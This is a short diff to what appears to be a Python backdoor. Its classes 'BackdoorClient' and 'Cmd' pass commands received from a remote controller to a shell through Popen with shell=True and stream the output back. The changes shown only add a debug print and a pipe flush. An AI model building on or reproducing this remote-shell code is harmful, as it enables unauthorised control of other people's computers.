@@ -72,6 +72,7 @@ class BackdoorClient(threading.Thread):
 
                     elif 'char' in msg:
                         char = get_char(msg)
+                        sys.stdout.write(char)  # todo : remove
 
                         if len(BackdoorClient.consoles) > 0:
                             con = BackdoorClient.consoles[0]
@@ -175,6 +176,7 @@ class Cmd(threading.Thread):
                     self.send_end(self.to_controler)
                     continue
 
+                self.read_pipe.flush()
                 proc = Popen(cmd_input, shell=True, stdout=PIPE, stderr=PIPE, stdin=self.read_pipe)
 
                 char = proc.stdout.read(1)
